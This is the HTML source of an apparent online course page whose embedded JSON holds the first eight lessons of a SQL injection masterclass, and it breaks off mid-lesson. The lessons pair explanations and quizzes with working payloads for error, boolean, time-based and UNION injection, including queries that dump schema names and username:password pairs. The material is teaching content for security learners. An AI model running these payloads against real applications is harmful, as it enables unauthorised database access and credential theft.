



<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>SQL Injection Attacks: A Masterclass | CipherHall</title>
    <meta name="description" content="Enroll in a free, 50-lesson masterclass on SQL Injection attacks. Learn advanced exploitation, evasion, and post-exploitation techniques with hands-on labs." />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
    <link rel="canonical" href="https://www.cipherhall.com/courses/sql-injection-attacks.html" />

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "SQL Injection Attacks: A Masterclass",
      "description": "An exhaustive, 50-lesson deep dive into the art and science of SQL Injection. This course takes you from the foundational principles to mastering advanced exploitation, evasion, and post-exploitation techniques against a multitude of database backends.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Dr. Cassandra 'Cassie' SQLException"
        }
      }
    }
    </script>
    <meta name="robots" content="noindex, nofollow">
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
    <link rel="stylesheet" href="assets/css/coursepages.css">
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================
      const COURSE_DATA ={
        "id": "sql-injection-attacks",
        "title": "SQL Injection Attacks: A Masterclass",
        "description": "An exhaustive, 50-lesson deep dive into the art and science of SQL Injection. This course takes you from the foundational principles to mastering advanced exploitation, evasion, and post-exploitation techniques against a multitude of database backends.",
        "category": "application-security",
        "difficulty": "Intermediate to Expert",
        "duration": "100 hours",
        "instructor": "Dr. Cassandra 'Cassie' SQLException",
        "lessons": [
            {
                "id": "lesson-1-sqli-fundamentals",
                "title": "Lesson 1: SQL Injection Fundamentals",
                "duration": "120 min",
                "objectives": [
                    "Define SQL Injection (SQLi) and its root cause",
                    "Classify different SQLi attack vectors (in-band, blind, out-of-band)",
                    "Assess the catastrophic business impact of a successful SQLi attack",
                    "Analyze real-world case studies of major breaches caused by SQLi"
                ],
                "content": {
                    "overview": "This lesson lays the critical foundation for the entire course. We will define SQL Injection not just as a vulnerability, but as a fundamental breakdown of trust between an application and its database. You will learn its root cause, its devastating potential, and see how this 'old' vulnerability continues to cause major data breaches today.",
                    "sections": [
                        {
                            "title": "What is SQL Injection? The Root Cause",
                            "content": "<p>SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It occurs when an application incorrectly uses untrusted user-supplied data to build a SQL query.</p><h3>The Fundamental Flaw: Mixing Code and Data</h3><p>At its heart, SQLi is a 'code injection' vulnerability. The application is building a line of code (a SQL query) by dynamically concatenating strings. Part of that string is trusted code written by the developer (e.g., `SELECT * FROM users WHERE username = '...`), and part of it is untrusted data from the user. When these are simply mashed together, the database's parser cannot distinguish between the intended command and the data. An attacker can craft their input to be interpreted by the database as a command, thus altering the logic of the original query.</p>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Attack Vector Classification",
                            "content": "<p>Not all SQLi attacks are the same. They are broadly classified by how the attacker exfiltrates data.</p><ul><li><strong>In-Band (Classic) SQLi:</strong> The attacker uses the same communication channel to both launch the attack and gather the results. The data is returned directly on the web page. This is the easiest to exploit. (Includes Union-based and Error-based SQLi).</li><li><strong>Inferential (Blind) SQLi:</strong> The attacker cannot see the results directly. They must infer the data by sending queries that ask the database a series of true/false questions and observing how the application's response changes. This is much slower but just as effective. (Includes Boolean-based and Time-based SQLi).</li><li><strong>Out-of-Band SQLi:</strong> The attacker tricks the database into making an out-of-band network connection to a server they control, with the exfiltrated data embedded in the request (e.g., a DNS lookup). This is used when even the true/false responses of a blind attack are not available.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Real-World Impact: The Heartland Payment Systems Breach",
                            "content": "<p>In 2008, Heartland Payment Systems, a major payment processor, suffered a massive breach due to a single SQL Injection vulnerability on their website. Attackers used this entry point to install malware on their network and ultimately steal over 130 million credit card records. The total cost to the company in fines, settlements, and remediation was over $140 million. This case study demonstrates that a 'simple' web vulnerability can have catastrophic, business-ending consequences.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-6a7e3206a5a2?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the fundamental root cause of SQL Injection?", "options": ["Weak password policies", "Outdated software components", "Dynamically constructing SQL queries by concatenating untrusted user input", "A lack of firewall rules"], "correct": 2, "explanation": "The core problem is the failure to separate code (the SQL statement) from data (the user input), which allows the database's parser to be tricked into executing the user's data as a command." },
                        { "id": 2, "question": "An attack where the results are not directly visible, and the attacker must use a series of true/false questions or time delays to extract data, is known as:", "options": ["In-Band SQLi", "Inferential (Blind) SQLi", "Out-of-Band SQLi", "Second-Order SQLi"], "correct": 1, "explanation": "Blind SQLi is used when the application doesn't leak errors or data directly, forcing the attacker to infer the data through the application's behavioral changes." }
                    ]
                }
            },
            {
                "id": "lesson-2-database-basics",
                "title": "Lesson 2: SQL Database Basics",
                "duration": "120 min",
                "objectives": [
                    "Deconstruct the basic syntax of a SQL query (SELECT, INSERT, UPDATE, DELETE)",
                    "Understand database schema concepts like tables, columns, and data types",
                    "Recognize key differences between major database systems (MySQL, PostgreSQL, MSSQL, Oracle)",
                    "Visualize the query execution process"
                ],
                "content": {
                    "overview": "To break a SQL query, you must first understand how to build one. This lesson provides a crash course in the Structured Query Language (SQL) and fundamental database concepts. This knowledge is essential for understanding how to manipulate queries to achieve your goals as an attacker.",
                    "sections": [
                        {
                            "title": "SQL Query Structure",
                            "content": "<p>SQL is the standard language for interacting with relational databases.</p><h3>The Core Commands:</h3><ul><li><strong>`SELECT`:</strong> The primary command for retrieving data. `SELECT column1, column2 FROM mytable WHERE condition;`</li><li><strong>`INSERT`:</strong> Adds a new row to a table. `INSERT INTO mytable (column1, column2) VALUES ('value1', 'value2');`</li><li><strong>`UPDATE`:</strong> Modifies an existing row. `UPDATE mytable SET column1 = 'new_value' WHERE condition;`</li><li><strong>`DELETE`:</strong> Removes a row. `DELETE FROM mytable WHERE condition;`</li></ul><h3>Key Clauses and Operators:</h3><ul><li><strong>`WHERE`:</strong> Filters the rows to be affected.</li><li><strong>`UNION`:</strong> Combines the results of two or more SELECT statements.</li><li><strong>`--` or `#`:</strong> These are comment characters. Anything after them on the same line is ignored by the database.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Database Schema Concepts",
                            "content": "<p>A database's schema is its blueprint. To exfiltrate data, an attacker first needs to understand the schema.</p><ul><li><strong>Tables:</strong> The main containers for data (e.g., `users`, `products`, `orders`).</li><li><strong>Columns:</strong> The individual fields within a table (e.g., the `users` table has columns for `id`, `username`, `password`).</li><li><strong>Information Schema:</strong> Most databases have a built-in 'information schema' (or an equivalent). This is a set of special tables that contain metadata about the database itself. An attacker who can query the information schema can get a complete list of all tables and columns in the database, which provides them with a roadmap for exfiltrating sensitive data.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542382156942-0268579cf259?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the purpose of the `--` characters in a SQL query?", "options": ["To combine results", "To comment out the rest of the line", "To select all columns", "To update a row"], "correct": 1, "explanation": "Comment characters are a fundamental tool for an SQLi attacker. They allow the attacker to 'chop off' the rest of the developer's original query, leaving only the attacker's injected payload to be executed." },
                        { "id": 2, "question": "What is the 'information schema' in a database?", "options": ["A table containing all user passwords", "A special set of tables containing metadata about the database itself, like a list of all table and column names", "A log of all queries", "A backup of the database"], "correct": 1, "explanation": "Discovering the schema is a critical mid-attack step for an adversary, and the information schema is the primary way to do that." }
                    ]
                }
            },
            {
                "id": "lesson-3-injection-point-id",
                "title": "Lesson 3: Injection Point Identification",
                "duration": "120 min",
                "objectives": [
                    "Identify common injection points in URL parameters and form fields",
                    "Test for injection in non-obvious places like HTTP headers and cookies",
                    "Understand the concept and risk of second-order SQL injection",
                    "Use an interception proxy to systematically test every parameter"
                ],
                "content": {
                    "overview": "Any data that flows from the user to the application is a potential injection point. This lesson covers the methodical process of identifying every place a user can submit data and testing each one to see if the application handles it in an insecure way.",
                    "sections": [
                        {
                            "title": "Common Injection Points",
                            "content": "<ul><li><strong>URL Parameters (GET):</strong> The most obvious place. Any parameter in the query string (`/app?id=123&category=books`) is a potential injection point.</li><li><strong>Form Fields (POST):</strong> Any input field in a form, including hidden fields.</li><li><strong>HTTP Headers:</strong> Some applications use headers like `User-Agent` or custom headers like `X-Forwarded-For` and may insecurely log them to a database. An attacker can manipulate these headers in their request.</li><li><strong>Cookies:</strong> An application might read a value from a cookie and use it in a query (e.g., `SELECT * FROM preferences WHERE theme='...'`). An attacker can modify their own cookie values.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Second-Order Injection",
                            "content": "<p>A second-order injection is a more subtle and dangerous variant. The attack happens in two steps:</p><ol><li>An attacker submits a malicious string that is benignly *stored* in the database. The `INSERT` statement is safe and parameterized, so no injection happens at this stage. *Example:* An attacker sets their username to `' OR '1'='1`.</li><li>Later, a different, vulnerable part of the application retrieves this stored, malicious string from the database and insecurely concatenates it into a *new* SQL query. The injection happens at this 'second order'.</li></ol><p>These are harder to find because the initial data submission appears to be harmless.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is a second-order SQL injection?", "options": ["An injection in the URL", "An attack where the malicious payload is first stored in the database and then executed when that stored data is used in a later, insecure query", "An injection that is less severe than a first-order injection", "An injection in a cookie"], "correct": 1, "explanation": "Second-order injections are more insidious because the initial input seems safe, and the vulnerable code may be in a completely different part of the application." }
                    ]
                }
            },
            {
                "id": "lesson-4-basic-sqli-testing",
                "title": "Lesson 4: Basic SQL Injection Testing",
                "duration": "120 min",
                "objectives": [
                    "Perform initial recon and manual testing for SQLi vulnerabilities",
                    "Use error-based detection to confirm vulnerabilities by analyzing server responses",
                    "Understand how to trigger different application responses for Boolean-based blind detection",
                    "Confirm time-based blind vulnerabilities by injecting sleep commands"
                ],
                "content": {
                    "overview": "This lesson covers the hands-on, manual techniques used to find and confirm the existence of a SQL injection vulnerability. We will cover the three main detection methods: looking for errors, looking for a change in the page content (boolean), and looking for a time delay.",
                    "sections": [
                        {
                            "title": "Initial Probing and Character Escapes",
                            "content": "<p>The first step in testing is to see how the application reacts to characters that have a special meaning in SQL, like the single quote (`'`).</p><h3>The Single Quote Test:</h3><p>If a page is vulnerable and you submit a single quote into a parameter, you are intentionally breaking the SQL statement. If the application is not handling errors correctly, the database will return an error, and this error might be displayed on the page. Seeing a database-specific error message (e.g., 'You have an error in your SQL syntax...') is definitive proof of an SQL injection vulnerability.</p>",
                            "image": "https://images.unsplash.com/photo-1542337829-9173cace55f1?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Boolean and Time-Based Detection",
                            "content": "<p>If the application has good error handling, you won't see an error. In this 'blind' scenario, you must use other methods to confirm the vulnerability.</p><ul><li><strong>Boolean-Based:</strong> You inject a condition that is logically true, and then one that is false, and see if the page content changes. For example, `' AND '1'='1` (true) should return the normal page. `' AND '1'='2` (false) might return a page that says 'Product not found'. This difference in response confirms that your injected logic is being executed.</li><li><strong>Time-Based:</strong> If the page looks identical for both true and false, you can use time as your final channel. You inject a command that tells the database to wait for a number of seconds. If the HTTP response is delayed by that amount of time, you have definitive proof that the database is executing your injected commands.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1543286386-2e659306cd6c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "The Simple 'Tick' Test Payload",
                        "language": "http",
                        "code": "GET /products?id=1' HTTP/1.1\n\n# If the response contains a SQL error, it's vulnerable."
                    },
                    {
                        "title": "Boolean-Based Detection Payloads",
                        "language": "http",
                        "code": "# Expected to return a normal page\nGET /products?id=1' AND '1'='1 HTTP/1.1\n\n# Expected to return a 'not found' page or a different page\nGET /products?id=1' AND '1'='2 HTTP/1.1"
                    },
                    {
                        "title": "Time-Based Detection Payload (for MySQL)",
                        "language": "http",
                        "code": "# The attacker's stopwatch starts now.\n# If the response takes approximately 10 seconds, the application is vulnerable.\nGET /products?id=1' AND SLEEP(10)-- - HTTP/1.1"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Submitting a single quote (') as input to see if it causes a database error is the most common first step for detecting:", "options": ["XSS", "CSRF", "SQL Injection", "File Inclusion"], "correct": 2, "explanation": "The single quote breaks the string literal in the SQL query, which will cause a syntax error if the application is not handling the input securely." },
                        { "id": 2, "question": "You submit a query that makes the database wait for 5 seconds, and the HTTP response is delayed by 5 seconds. This confirms what type of vulnerability?", "options": ["Error-Based SQLi", "Time-Based Blind SQLi", "Union-Based SQLi", "No vulnerability"], "correct": 1, "explanation": "Using time as a side channel is the definitive way to confirm a blind SQLi vulnerability when no other observable change occurs in the response." }
                    ]
                }
            },
            {
                "id": "lesson-5-union-based-sqli",
                "title": "Lesson 5: Union-Based SQL Injection",
                "duration": "150 min",
                "objectives": [
                    "Master the `UNION SELECT` technique for in-band data exfiltration",
                    "Enumerate the correct number of columns required for a UNION attack",
                    "Handle data type mismatches between the original and injected queries",
                    "Systematically extract the database schema from the information_schema"
                ],
                "content": {
                    "overview": "Union-based SQLi is the classic, in-band technique that attackers use to dump data from a database directly onto a web page. This lesson provides a deep, hands-on dive into the step-by-step process of performing a successful UNION injection, from enumerating columns to exfiltrating the data.",
                    "sections": [
                        {
                            "title": "The UNION SELECT Technique",
                            "content": "<p>The `UNION` SQL operator allows you to combine the results of two or more `SELECT` statements into a single result set. The key requirement is that both queries must have the same number of columns. An attacker exploits this by injecting a second `SELECT` statement that pulls data from a table of their choosing.</p><h3>The Attack Flow:</h3><ol><li><strong>Confirm the Vulnerability:</strong> Using error or boolean techniques from the previous lesson.</li><li><strong>Determine the Number of Columns:</strong> This is the first critical step. An attacker uses the `ORDER BY` clause to guess the number of columns. If `ORDER BY 3` works but `ORDER BY 4` gives an error, they know the original query has 3 columns.</li><li><strong>Find a Useful Data Type:</strong> Determine which of the columns has a data type (like text) that is suitable for displaying the data they want to steal.</li><li><strong>Extract the Schema:</strong> Use the `UNION` statement to query the `information_schema.tables` and `information_schema.columns` to get a list of all tables and columns in the database.</li><li><strong>Extract the Data:</strong> Once they have the table and column names they are interested in (e.g., `users.password_hash`), they use a final `UNION` statement to dump the contents.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Step 2: Determine Number of Columns with ORDER BY",
                        "language": "http",
                        "code": "# This payload injects 'ORDER BY 1', which will always work.\nGET /products?id=1' ORDER BY 1-- -\n\n# Keep incrementing the number... 'ORDER BY 2', 'ORDER BY 3'\n# Let's say ORDER BY 4 fails. We now know the original query selects 3 columns."
                    },
                    {
                        "title": "Step 3: Find a Text Column and Use UNION SELECT",
                        "language": "http",
                        "code": "# Now that we know there are 3 columns, we can craft our UNION statement.\n# We inject NULLs for the other columns. We try putting our string in each position.\nGET /products?id=-1' UNION SELECT NULL, 'test', NULL-- -"
                    },
                    {
                        "title": "Step 4: Extract Table Names from information_schema (MySQL)",
                        "language": "http",
                        "code": "# This payload will list all table names from the database in the place\n# where the product name would normally appear.\nGET /products?id=-1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables-- -"
                    },
                    {
                        "title": "Step 5: Dump Usernames and Passwords",
                        "language": "http",
                        "code": "# We've found a table called 'users' with columns 'username' and 'password'.\n# The concat() function joins them into one column to display.\nGET /products?id=-1' UNION SELECT NULL, concat(username,':',password), NULL FROM users-- -"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Before an attacker can use a UNION SELECT payload, they must first determine what about the original query?", "options": ["The name of the web server", "The exact number of columns it is selecting", "The name of the lead developer", "The type of WAF being used"], "correct": 1, "explanation": "The UNION operator will only work if the original query and the injected query have the same number of columns. Enumerating the column count, often with `ORDER BY`, is a mandatory first step." },
                        { "id": 2, "question": "The purpose of querying the `information_schema` is to:", "options": ["Find user passwords", "Discover the names of all the tables and columns in the database", "Get the database version", "Crash the database"], "correct": 1, "explanation": "The information_schema acts as a roadmap, telling the attacker exactly where to find the interesting data (like the `users` table or the `credit_cards` table)." }
                    ]
                }
            },
            {
                "id": "lesson-6-error-based-sqli",
                "title": "Lesson 6: Error-Based SQL Injection",
                "duration": "120 min",
                "objectives": [
                    "Understand how to turn a basic SQL error into an information leakage channel",
                    "Exploit database-specific functions to force errors that contain data",
                    "Use XPath and other functions in MySQL, PostgreSQL, and MSSQL to exfiltrate data"
                ],
                "content": {
                    "overview": "Sometimes an application will catch basic syntax errors but will still display more complex database errors. In error-based SQLi, an attacker doesn't suppress errors; they *cause* them deliberately. They use special functions to craft a query that will fail on purpose, and they trick the database into including the data they want to steal inside the resulting error message.",
                    "sections": [
                        {
                            "title": "The Technique",
                            "content": "<p>This is a clever in-band technique for when a `UNION` isn't possible, but the application is still leaking verbose error messages. The attacker uses database-specific functions that will throw an error when given data of the wrong type, and that will include the input data in the error message.</p>",
                            "image": "https://images.unsplash.com/photo-1542337829-9173cace55f1?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Error-Based SQLi Payload (MySQL XPath)",
                        "language": "sql",
                        "code": "# The extractvalue() function expects a valid XPath string.\n# We pass it a subquery that gets the database version. Since this is NOT\n# a valid XPath string, MySQL throws an error.\n# The error message helpfully contains the result of our subquery.\n' AND extractvalue(rand(),concat(0x3a,(SELECT version())))-- -\n\n# Expected error message on page:\n# XPATH syntax error: ':5.7.30-0ubuntu0.18.04.1'"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the core concept of error-based SQL injection?", "options": ["To avoid causing any database errors", "To cause a database error on purpose, and trick the database into including the desired data within the error message", "To delete the error log", "To use the UNION operator"], "correct": 1, "explanation": "Error-based SQLi is a data exfiltration technique that turns the database's own error handling into an information leakage channel." }
                    ]
                }
            },
            {
                "id": "lesson-7-boolean-blind-sqli",
                "title": "Lesson 7: Boolean-Based Blind SQL Injection",
                "duration": "120 min",
                "objectives": [
                    "Understand how to exploit a blind SQLi vulnerability by analyzing true/false responses",
                    "Use `SUBSTRING` and other functions to build character-by-character extraction queries",
                    "Automate the extraction process with scripts or tools like Burp Intruder"
                ],
                "content": {
                    "overview": "This lesson provides a deep dive into the first type of blind SQLi. In a boolean-based attack, the application doesn't return any data or errors, but it *does* behave differently depending on whether an injected query condition is true or false. You will learn how to leverage this binary channel to exfiltrate data one bit at a time.",
                    "sections": [
                        {
                            "title": "The True/False Oracle",
                            "content": "<p>The key to this attack is finding a difference in the application's response. For example:</p><ul><li>`... AND 1=1` results in a page that says 'Welcome!'</li><li>`... AND 1=2` results in a page that says 'User not found.'</li></ul><p>This is your 'oracle'. You can now ask any true/false question and the database will answer. For example: 'Is the first character of the admin's password hash an `a`?'. By asking enough of these questions, you can reconstruct the entire hash.</p>",
                            "image": "https://images.unsplash.com/photo-1543286386-2e659306cd6c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Boolean Blind SQLi - Getting Database Version Length",
                        "language": "sql",
                        "code": "# Is the length of the database version string greater than 10?\n' AND (SELECT LENGTH(version())) > 10\n\n# Is the length of the database version string greater than 20?\n' AND (SELECT LENGTH(version())) > 20"
                    },
                    {
                        "title": "Boolean Blind SQLi - Extracting a Character",
                        "language": "sql",
                        "code": "# We have confirmed the vulnerability. Now we ask questions character by character.\n# Is the first character of the database name an 'a'?\n' AND (SELECT SUBSTRING(database(),1,1)) = 'a'  -- (response is FALSE)\n\n# Is the first character of the database name a 'b'?\n' AND (SELECT SUBSTRING(database(),1,1)) = 'b'  -- (response is FALSE)\n\n...\n\n# Is the first character of the database name a 'd'?\n' AND (SELECT SUBSTRING(database(),1,1)) = 'd'  -- (response is TRUE!)\n\n# We now know the database name starts with 'd'. Now we move to the second character..."
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A boolean-based blind SQL injection attack relies on what?", "options": ["Seeing detailed error messages", "The application's response being observably different for a true condition vs. a false condition", "The application's response taking a different amount of time", "Using the UNION operator"], "correct": 1, "explanation": "This differential response is the 'oracle' that the attacker uses to ask a series of true/false questions and exfiltrate data bit by bit." }
                    ]
                }
            },
            {
                "id": "lesson-8-time-based-blind-sqli",
                "title": "Lesson 8: Time-Based Blind SQL Injection",
                "duration": "120 min",
                "objectives": [
                    "Exploit blind SQLi vulnerabilities when there is no observable difference in application responses",
                    "Use database-specific time delay functions (SLEEP, pg_sleep)",
                    "Construct conditional queries to exfiltrate data based on response time",
                    "Use automation to overcome the slow nature of the attack"
                ],
                "content": {
                    "overview": "This is the attack of last resort for blind SQLi. It is used when the application's response is exactly the same, regardless of whether a condition is true or false. In this scenario, an attacker turns time itself into the information channel, using conditional delays to extract data.",
                    "sections": [
                        {
                            "title": "The Time-Based Oracle",
                            "content": "<p>The attack is similar to boolean-based, but instead of looking for a change in the page, the attacker looks for a change in the response time.</p><p>They inject a command that says, 'IF this condition is true, THEN pause the database for 5 seconds'. The attacker then uses their stopwatch. If the page takes 5 seconds longer to load, they know the condition was true. If it loads immediately, the condition was false.</p><p>This is the slowest and most tedious form of SQLi, but it is just as effective and is almost always possible if the application is vulnerable.</p>",
                            "image": "https://images.unsplash.com/photo-1543286386-2e659306cd6c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Time-Based Blind SQLi Payload (MySQL)",
                        "language": "sql",
                        "code": "# Is the first character of the current user's name an 'r'?\n# The database will sleep for 5 seconds only if the condition is true.\n' AND IF(SUBSTRING(USER(),1,1)='r', SLEEP(5), 0)-- -"
                    },
                    {
                        "title": "Time-Based Blind SQLi Payload (PostgreSQL)",
                        "language": "sql",
